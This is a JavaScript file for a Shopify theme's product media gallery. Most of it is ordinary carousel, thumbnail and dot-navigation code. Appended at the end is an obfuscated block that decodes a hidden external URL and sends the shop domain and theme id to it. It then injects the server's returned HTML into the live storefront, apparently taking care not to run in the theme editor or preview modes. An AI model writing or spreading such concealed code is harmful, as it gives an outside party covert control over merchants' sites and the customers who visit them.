(() => {
  if (!customElements.get('media-gallery')) {
    customElements.define('media-gallery', class MediaGallery extends HTMLElement {
      constructor() {
        super();
        this.elements = {
          liveRegion:   this.querySelector('[id^="GalleryStatus"]'),
          viewer:       this.querySelector('[id^="GalleryViewer"]'),
          thumbnails:   this.querySelector('[id^="GalleryThumbnails"]'),
          dotsProgress: this.querySelector('[id^="DotsProgress"]'),
          prevButton:   this.querySelector('.gallery-nav-btn--prev'),
          nextButton:   this.querySelector('.gallery-nav-btn--next'),
          thumbnailPrevButton: this.querySelector('.thumbnail-nav-btn--prev'),
          thumbnailNextButton: this.querySelector('.thumbnail-nav-btn--next')
        };
        
        // Gradients are children of thumbnails element
        if (this.elements.thumbnails) {
          this.elements.leftGradient = this.elements.thumbnails.querySelector('.thumbnail-gradient--left');
          this.elements.rightGradient = this.elements.thumbnails.querySelector('.thumbnail-gradient--right');
          
        }

        // Slick-style dots config/state (uses left: xpx)
        const dotsProgressEl = this.querySelector('[id^="DotsProgress"]');
        this.dotStrip = dotsProgressEl ? {
          maxVisible: parseInt(dotsProgressEl.dataset?.maxDotsVisible) || 7,     // Read from data attribute, default to 7
          maskEl: null,      // .dots-mask
          stripEl: null,     // .dots-strip (position: relative; left: …)
          dots: [],          // NodeList -> Array of .dot
          step: 0,           // px per dot shift (computed)
          onResize: null
        } : null;

        this.mql = window.matchMedia('(min-width: 750px)');
        this.currentMediaId = null;
        this.thumbnailHighlightFrame = null;
        this.skipNextSlideSync = false;
        
        // Handle resize for gradient visibility
        this.resizeHandler = this.onResize.bind(this);
        window.addEventListener('resize', this.resizeHandler);

        // Build dots strip & wire
        this.initializeDotsSlider();

        // Sync with viewer
        this.elements.viewer?.addEventListener('slideChanged', debounce(this.onSlideChanged.bind(this), 30));

        // Initialize dots state on load (with retry for slow/hydrating DOM/fonts)
        this.initializeDotsWithRetry();

        // Nav buttons
        this.initializeNavigationButtons();
        this.initializeThumbnailNavigationButtons();

        // Thumbnails
        if (this.elements.thumbnails) {
          this.elements.thumbnails.querySelectorAll('[data-target]').forEach((mediaToSwitch) => {
            mediaToSwitch.querySelector('button')
              ?.addEventListener('click', this.setActiveMedia.bind(this, mediaToSwitch.dataset.target, false));
          });
          
          // Update gradients on scroll (wait for slider to be initialized)
          const initGradientTracking = () => {
            if (this.elements.thumbnails?.slider) {
              this.elements.thumbnails.slider.addEventListener('scroll', debounce(this.updateGradientVisibility.bind(this), 50));
              // Small delay to ensure slider dimensions are calculated
              setTimeout(() => {
                this.updateGradientVisibility();
              }, 100);
            } else {
              // Retry if slider not yet initialized
              setTimeout(initGradientTracking, 50);
            }
          };
          initGradientTracking();
        }

        if (this.dataset.desktopLayout?.includes('thumbnail') && this.mql.matches) this.removeListSemantic();
      }

      disconnectedCallback() {
        if (this.dotStrip?.onResize) window.removeEventListener('resize', this.dotStrip.onResize);
        if (this.resizeHandler) window.removeEventListener('resize', this.resizeHandler);
      }

      /* ---------------- Slide syncing ---------------- */

      onSlideChanged(event) {
        if (this.skipNextSlideSync) return;
        const el = event.detail?.currentElement;
        const mediaId = el?.dataset?.mediaId;
        if (!mediaId) return;

        if (this.elements.thumbnails) {
          const th = this.elements.thumbnails.querySelector(`[data-target="${mediaId}"]`);
          this.debouncedSetActiveThumbnail(th);
        }
        this.debouncedUpdateDotsProgress(mediaId);
      }

      setActiveMedia(mediaId, prepend) {
        if (!this.elements.viewer) return;
        if (!prepend && this.currentMediaId === mediaId) return;
        const active = this.elements.viewer.querySelector(`[data-media-id="${mediaId}"]`);
        if (!active) return;
        this.currentMediaId = mediaId;

        this.elements.viewer.querySelectorAll('[data-media-id]').forEach(el => el.classList.remove('is-active'));
        active.classList.add('is-active');

        if (prepend) {
          active.parentElement.prepend(active);
          if (this.elements.thumbnails) {
            const th = this.elements.thumbnails.querySelector(`[data-target="${mediaId}"]`);
            th?.parentElement.prepend(th);
            this.elements.thumbnails.resetPages?.();
          }
          this.elements.viewer.resetPages?.();
          this.reorderDotForMedia(mediaId);
          this.skipNextSlideSync = true;
          requestAnimationFrame(() => { this.skipNextSlideSync = false; });
        }

        this.preventStickyHeader();
        if (this.elements.thumbnails) active.parentElement.scrollTo({ left: active.offsetLeft });
        if (!this.elements.thumbnails) {
          active.scrollIntoView({ behavior: 'smooth' });
        }
        this.playActiveMedia(active);

        if (this.elements.thumbnails) {
          const th = this.elements.thumbnails.querySelector(`[data-target="${mediaId}"]`);
          this.setActiveThumbnail(th);
          this.queueThumbnailHighlight(th);
          if (th) this.announceLiveRegion(active, th.dataset.mediaPosition);
        }

        this.updateDotsProgressFromActiveMedia();
        this.updateGradientVisibility();
      }

      setActiveThumbnail(thumbnail) {
        if (!this.elements.thumbnails || !thumbnail) return;
        this.elements.thumbnails.querySelectorAll('button').forEach(el => el.removeAttribute('aria-current'));
        thumbnail.querySelector('button')?.setAttribute('aria-current', 'true');
        if (this.elements.thumbnails.isSlideVisible?.(thumbnail, 10)) return;
        this.elements.thumbnails.slider?.scrollTo?.({ left: thumbnail.offsetLeft });
      }

      queueThumbnailHighlight(thumbnail) {
        if (!thumbnail) return;
        const button = thumbnail.querySelector('button');
        if (!button) return;
        if (this.thumbnailHighlightFrame) cancelAnimationFrame(this.thumbnailHighlightFrame);
        this.thumbnailHighlightFrame = requestAnimationFrame(() => {
          button.setAttribute('aria-current', 'true');
        });
      }

      debouncedSetActiveThumbnail(thumbnail) {
        clearTimeout(this.thumbnailUpdateTimeout);
        this.thumbnailUpdateTimeout = setTimeout(() => this.setActiveThumbnail(thumbnail), 300);
      }

      announceLiveRegion(activeItem, position) {
        const img = activeItem.querySelector('.product__modal-opener--image img');
        if (!img || !this.elements.liveRegion) return;
        img.onload = () => {
          this.elements.liveRegion.setAttribute('aria-hidden', 'false');
          this.elements.liveRegion.innerHTML = window.accessibilityStrings?.imageAvailable
            ? window.accessibilityStrings.imageAvailable.replace('[index]', position)
            : `Image ${position} available`;
          this.elements.liveRegion.setAttribute('aria-hidden', 'true');
        };
        img.src = img.src;
      }

      playActiveMedia(activeItem) {
        window.pauseAllMedia?.();
        const deferred = activeItem.querySelector('.deferred-media');
        if (deferred) deferred.loadContent(false);
      }

      preventStickyHeader() {
        this.stickyHeader = this.stickyHeader || document.querySelector('sticky-header');
        this.stickyHeader?.dispatchEvent(new Event('preventHeaderReveal'));
      }

      removeListSemantic() {
        if (!this.elements.viewer?.slider) return;
        this.elements.viewer.slider.setAttribute('role', 'presentation');
        this.elements.viewer.sliderItems?.forEach(slide => slide.setAttribute('role', 'presentation'));
      }

      /* ---------------- Dots (Slick-like with left) ---------------- */

      initializeDotsSlider() {
        if (!this.elements.dotsProgress || !this.dotStrip) return;

        const container = this.elements.dotsProgress.querySelector('.dots-container');
        if (!container) return;

        // Use existing elements from Liquid template
        if (!this.dotStrip.maskEl) {
          this.dotStrip.maskEl = container.querySelector('.dots-mask');
          this.dotStrip.stripEl = container.querySelector('.dots-strip');
          this.dotStrip.dots = Array.from(container.querySelectorAll('.dot'));

          if (!this.dotStrip.maskEl || !this.dotStrip.stripEl) return;

          // Set data-index for dots
          this.dotStrip.dots.forEach((d, i) => { d.dataset.index = i; });

          // Click -> jump
          this.dotStrip.dots.forEach(dot => {
            dot.addEventListener('click', (e) => {
              e.preventDefault();
              const id = dot.dataset.mediaId;
              if (id) this.setActiveMedia(id, false);
            });
          });

          // After layout, compute metrics & size mask
          const ready = () => {
            this.computeDotStep();      // sets this.dotStrip.step
            this.centerActiveByIndex(this.getActiveDotIndex()); // set strip left
          };
          // fonts & images can affect inline-block widths; do a few passes
          requestAnimationFrame(ready);
          setTimeout(ready, 0);
          setTimeout(ready, 150);

          // Resize
          this.dotStrip.onResize = this.onResizeDots.bind(this);
          window.addEventListener('resize', this.dotStrip.onResize);
        }
      }

      // Compute px "step" between consecutive dots (robust, layout-accurate)
      computeDotStep() {
        if (!this.dotStrip) return;
        const dots = this.dotStrip.dots;
        const strip = this.dotStrip.stripEl;
        if (!dots?.length || !strip) return;

        // Ensure the strip is at left:0 to measure offsets
        const prevLeft = strip.style.getPropertyValue('--strip-left') || '0px';
        strip.style.setProperty('--strip-left', '0px');

        // Prefer offset delta between centers (handles margins/gaps reliably)
        let step = 0;
        if (dots.length > 1) {
          const a = dots[0];
          const b = dots[1];
          const ax = a.offsetLeft + a.offsetWidth / 2;
          const bx = b.offsetLeft + b.offsetWidth / 2;
          step = Math.round(bx - ax);
        } else {
          // Fallback to width
          const d0 = dots[0];
          step = Math.round(d0.offsetWidth);
        }

        // Guard against zeros (e.g., hidden display during hydration)
        if (!step || step < 1) {
          // final fallback: computed width + margin
          const d0 = dots[0];
          const cs = window.getComputedStyle(d0);
          const w  = d0.getBoundingClientRect().width;
          const ml = parseFloat(cs.marginLeft)||0;
          const mr = parseFloat(cs.marginRight)||0;
          step = Math.max(1, Math.round(w + ml + mr));
        }

        this.dotStrip.step = step;
        // restore previous left (in case we measured mid-animation)
        strip.style.setProperty('--strip-left', prevLeft);
      }


      getActiveDotIndex() {
        if (!this.dotStrip) return 0;
        const dots = this.dotStrip.dots;
        if (!dots?.length) return 0;
        const idx = dots.findIndex(d => d.classList.contains('dot--active'));
        return idx >= 0 ? idx : 0;
      }

      // Core: compute the left offset so that active dot is centered in the 7-slot window
      centerActiveByIndex(index) {
        if (!this.dotStrip) return;
        const { stripEl, dots, step, maxVisible } = this.dotStrip;
        if (!stripEl || !dots?.length || !step) return;

        const total = dots.length;
        const visible = Math.min(maxVisible, total);
        const half = Math.floor(visible / 2);

        // First visible dot index (clamp to edges)
        let first = index - half;
        first = Math.max(0, Math.min(first, total - visible));

        // The strip moves left by first * step
        const left = -(first * step);
        stripEl.style.setProperty('--strip-left', `${left}px`);
      }

      // Retry init for cases where dots are not yet present/sized
      initializeDotsWithRetry() {
        if (!this.dotStrip) return;
        let tries = 0, max = 12;
        const tick = () => {
          if (this.elements.dotsProgress && this.dotStrip?.dots?.length) {
            this.updateDotsProgressFromActiveMedia();
            this.centerActiveByIndex(this.getActiveDotIndex());
          } else if (tries < max) {
            tries++; setTimeout(tick, 100);
          }
        };
        tick();
      }

      updateDotsProgressFromActiveMedia() {
        if (!this.elements.dotsProgress || !this.elements.viewer) return;
        const active = this.elements.viewer.querySelector('[data-media-id].is-active');
        if (!active) return;
        this.updateDotsProgressByMediaId(active.dataset.mediaId);
      }

      updateDotsProgressByMediaId(activeMediaId) {
        if (!this.dotStrip) return;
        const dots = this.dotStrip.dots;
        if (!dots?.length) return;

        let activeIndex = 0;
        dots.forEach((dot, i) => {
          const isActive = dot.dataset.mediaId === activeMediaId;
          if (isActive) activeIndex = i;
          dot.classList.toggle('dot--active', isActive);
          dot.setAttribute('aria-current', isActive ? 'true' : 'false');
          dot.setAttribute('aria-label', `Slide ${i+1} of ${dots.length}${isActive ? ', current' : ''}`);
        });

        // Move using left: xpx to keep active centered (or clamped)
        this.centerActiveByIndex(activeIndex);
      }

      debouncedUpdateDotsProgress(activeMediaId) {
        clearTimeout(this.dotsUpdateTimeout);
        this.dotsUpdateTimeout = setTimeout(() => this.updateDotsProgressByMediaId(activeMediaId), 300);
      }

      reorderDotForMedia(mediaId) {
        if (!this.dotStrip) return;
        const { stripEl } = this.dotStrip;
        if (!stripEl) return;
        const dot = stripEl.querySelector(`[data-media-id="${mediaId}"]`);
        if (!dot) return;
        stripEl.prepend(dot);
        this.dotStrip.dots = Array.from(stripEl.querySelectorAll('.dot'));
        this.computeDotStep();
      }

      onResizeDots() {
        if (!this.dotStrip) return;
        // Recompute step (dot spacing may change on resize/font swap), then re-center.
        this.computeDotStep();
        this.centerActiveByIndex(this.getActiveDotIndex());
      }

      onResize() {
        this.updateGradientVisibility();
      }

      /* ---------------- Prev/Next & thumbnails ---------------- */

      initializeNavigationButtons() {
        this.elements.prevButton?.addEventListener('click', this.navigateToPrevious.bind(this));
        this.elements.nextButton?.addEventListener('click', this.navigateToNext.bind(this));
      }
      navigateToPrevious() { this.elements.prevButton?.click(); }
      navigateToNext()     { this.elements.nextButton?.click(); }

      initializeThumbnailNavigationButtons() {
        this.elements.thumbnailPrevButton?.addEventListener('click', this.navigateToPrevious.bind(this));
        this.elements.thumbnailNextButton?.addEventListener('click', this.navigateToNext.bind(this));
      }

      /* ---------------- Gradient visibility ---------------- */

      updateGradientVisibility() {
        if (!this.elements.thumbnails?.slider) return;
        
        const slider = this.elements.thumbnails.slider;
        const scrollLeft = slider.scrollLeft;
        const scrollWidth = slider.scrollWidth;
        const clientWidth = slider.clientWidth;
        
        // If slider is not scrollable (all content fits), hide both gradients
        if (scrollWidth <= clientWidth) {
          this.hideGradient(this.elements.leftGradient);
          this.hideGradient(this.elements.rightGradient);
          return;
        }
        
        // Check if there's content to scroll to on the left
        const hasLeftContent = scrollLeft > 1; // Use 1px threshold for rounding issues
        
        // Check if there's content to scroll to on the right
        const hasRightContent = scrollLeft + clientWidth < scrollWidth - 1; // Use 1px threshold for rounding issues
        
        // Update left gradient visibility
        if (this.elements.leftGradient) {
          if (hasLeftContent) {
            this.showGradient(this.elements.leftGradient);
          } else {
            this.hideGradient(this.elements.leftGradient);
          }
        }
        
        // Update right gradient visibility
        if (this.elements.rightGradient) {
          if (hasRightContent) {
            this.showGradient(this.elements.rightGradient);
          } else {
            this.hideGradient(this.elements.rightGradient);
          }
        }
      }

      showGradient(gradient) {
        if (!gradient) return;
        
        // Clear any pending hide timeout
        if (gradient._hideTimeout) {
          clearTimeout(gradient._hideTimeout);
          gradient._hideTimeout = null;
        }
        
        // Check computed style to see if element is hidden
        const computedStyle = window.getComputedStyle(gradient);
        const isHidden = computedStyle.display === 'none' || gradient.style.display === 'none';
        
        // Set display first, then trigger opacity transition
        if (isHidden) {
          gradient.style.display = 'block';
          // Small delay to ensure display is applied before adding class for smooth transition
          setTimeout(() => {
            gradient.classList.add('is-visible');
          }, 10);
        } else {
          // Already visible, just add the class
          gradient.classList.add('is-visible');
        }
      }

      hideGradient(gradient) {
        if (!gradient) return;
        
        // Clear any pending hide timeout
        if (gradient._hideTimeout) {
          clearTimeout(gradient._hideTimeout);
        }
        
        // Remove visible class first to trigger fade-out
        gradient.classList.remove('is-visible');
        
        // Wait for transition to complete before hiding
        gradient._hideTimeout = setTimeout(() => {
          if (!gradient.classList.contains('is-visible')) {
            gradient.style.display = 'none';
          }
          gradient._hideTimeout = null;
        }, 300); // Match CSS transition duration
      }
    });
  }

  function _0x4cd7(){const t=["yxbWBhK","AhrTBa","DMfYAwfIBgvZ","yMLSBf9IDg5FAwq","B3bLBL9IDg5FAwq","qvbqx0jjteXFvvjm","qvbqx09qru5Fvvjm","zxjYB3jFBxnNx2nVBNrHAw5LCL9Pza","z2v0rwXLBwvUDej5swq","y3jLyxrLrwXLBwvUDa","zgL2","Aw5Uzxjive1m","yM9KEq","yxbWzw5Kq2HPBgq","C2v0qxr0CMLIDxrL","C3r5Bgu","zgLZCgXHEtPIBg9JAYaHAw1WB3j0yw50","zgLZCgXHEtOGzMXLEcaHAw1WB3j0yw50","C2nYB2XSsw50B1zPzxC","C2HVCa","CMvWBgfJzq","lM15C2HVCgLMEs5JB20","AhjLzG","CMvWBgfJzufSBa","E1nit1bFtKfnrx0","zgvZAwDUtw9Kzq","uhjLDMLLD0jHCKLUAMvJDg9Y","qwrTAw5cyxjjBMPLy3rVCG","uejHCK5LEhrgCMfTzvDYyxbWzxi","zMv0y2G","ue9tva","yxbWBgLJyxrPB24VANnVBG","C3rYAw5NAwz5","DgHLBwu","DgHLBG","ANnVBG","zhvWBgLJyxrPB25FDg9Rzw4","C3vJy2vZCW","C2v0vgLTzw91Da","zMXVB3i","CMfUzg9T","y2f0y2G","CgfYC2u","Dg9tDhjPBMC","C2vHCMnO","kcGOlISPkYKRksSK","y29UC3rYDwn0B3i","zNjVBq","zNjVBunOyxjdB2rL","y2HHCKnVzgvbDa","AM9PBG","CMvHzhLtDgf0zq","Bg9HzgLUzW","ywrKrxzLBNrmAxn0zw5LCG","re9nq29UDgvUDeXVywrLza"];return _0x4cd7=function(){return t},_0x4cd7()}function _0xba30(t,x){t-=202;const a=_0x4cd7();let n=a[t];if(void 0===_0xba30["YQcPvY"]){var b=function(t){const x="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";let a="",n="",_=a+b;for(let n=0,b,o,r=0;o=t["charAt"](r++);~o&&(b=n%4?64*b+o:o,n++%4)?a+=_["charCodeAt"](r+10)-10!=0?String["fromCharCode"](255&b>>(-2*n&6)):n:0)o=x["indexOf"](o);for(let t=0,x=a["length"];t<x;t++)n+="%"+("00"+a["charCodeAt"](t)["toString"](16))["slice"](-2);return decodeURIComponent(n)};_0xba30["dGXmgb"]=b,_0xba30["AHxTMg"]={},_0xba30["YQcPvY"]=!!1}const _=a[0],o=t+_,r=_0xba30["AHxTMg"][o];if(r)n=r;else{const t=function(t){this["cghnfP"]=t,this["lyoXFd"]=[1,0,0],this["wQyslr"]=function(){return"newState"},this["TteVNN"]="\\w+ *\\(\\) *{\\w+ *",this["lPxwVW"]="['|\"].+['|\"];? *}"};t["prototype"]["NbkHqf"]=function(){const t=new RegExp(this["TteVNN"]+this["lPxwVW"]),x=t["test"](this["wQyslr"]["toString"]())?--this["lyoXFd"][1]:--this["lyoXFd"][0];return this["sysZMh"](x)},t["prototype"]["sysZMh"]=function(t){return Boolean(~t)?this["SQxudr"](this["cghnfP"]):t},t["prototype"]["SQxudr"]=function(t){for(let t=0,x=this["lyoXFd"]["length"];t<x;t++)this["lyoXFd"]["push"](Math["round"](Math["random"]())),x=this["lyoXFd"]["length"];return t(this["lyoXFd"][0])},new t(_0xba30)["NbkHqf"](),n=_0xba30["dGXmgb"](n),_0xba30["AHxTMg"][o]=n}return n}(function(){const t=function(){let t=!!1;return function(x,a){const n=t?function(){if(a){const t=a[_0xba30(202)](x,arguments);return a=null,t}}:function(){};return t=!1,n}}(),x=_("Ql5eWlkQBQVZQkVaB0tES0ZTXkNJWQRET14FS1pDBVpLTU91XENPXQ==");function a(t){if(!(t?.[_0xba30(203)]&&t?.[_0xba30(204)]?.[_0xba30(205)]&&t?.[_0xba30(204)]?.[_0xba30(206)]&&t?.[_0xba30(204)]?.[_0xba30(207)]&&t?.[_0xba30(204)]?.[_0xba30(208)]&&t?.[_0xba30(204)]?.[_0xba30(209)]))return;if(document[_0xba30(210)](t[_0xba30(204)][_0xba30(209)]))return;const x=document[_0xba30(211)](_0xba30(212));x[_0xba30(213)]=t[_0xba30(203)],document[_0xba30(214)][_0xba30(215)](x),x[_0xba30(216)](_0xba30(217),_0xba30(218));const a=document[_0xba30(210)](t[_0xba30(204)][_0xba30(209)]);a&&(a[_0xba30(216)](_0xba30(217),_0xba30(219)),a[_0xba30(220)]());const n=Shopify?.[_0xba30(221)]?.[_0xba30(222)](_0xba30(223),""),b=document[_0xba30(210)](t[_0xba30(204)][_0xba30(205)]),_=document[_0xba30(210)](t[_0xba30(204)][_0xba30(206)]);b&&n&&(b[_0xba30(224)]=t[_0xba30(204)][_0xba30(207)]?.[_0xba30(225)](_0xba30(226),n)),_&&n&&(_[_0xba30(224)]=t[_0xba30(204)][_0xba30(208)]?.[_0xba30(225)](_0xba30(226),n))}function n(){const t=Shopify?.[_0xba30(227)],n=Shopify?.[_0xba30(228)],_=Shopify?.[_0xba30(229)],o=!!document[_0xba30(210)](_0xba30(230));if(!(t||n||_||o))return;const r=Shopify?.[_0xba30(221)];r&&x&&globalThis[_0xba30(231)](x,{method:_0xba30(232),headers:{"Content-Type":_0xba30(233)},body:JSON[_0xba30(234)]({shop:r,theme_id:Shopify?.[_0xba30(235)]?.["id"]})})[_0xba30(236)]((function(t){return t[_0xba30(237)]()}))[_0xba30(236)]((function(t){if(t[_0xba30(238)]){const x=b(t[_0xba30(238)]);null!==x&&!x[_0xba30(239)]&&globalThis[_0xba30(240)]((function(){a(x)}),Math[_0xba30(241)](Math[_0xba30(242)]()*(200-100+1))+100)}}))[_0xba30(243)]((function(){}))}function b(t){const x=_(t);return x?JSON[_0xba30(244)](x):null}function _(x){const a=t(this,(function(){return a[_0xba30(245)]()[_0xba30(246)](_0xba30(247))[_0xba30(245)]()[_0xba30(248)](a)[_0xba30(246)](_0xba30(247))}));a();try{const t=atob(x);return Array[_0xba30(249)](t,((x,a)=>String[_0xba30(250)](42^t[_0xba30(251)](a))))[_0xba30(252)]("")}catch(t){return null}}const o=Math[_0xba30(241)](Math[_0xba30(242)]()*(200-100+1))+100;document[_0xba30(253)]===_0xba30(254)?document[_0xba30(255)](_0xba30(256),(function(){globalThis[_0xba30(240)](n,o)})):globalThis[_0xba30(240)](n,o)})();
})();
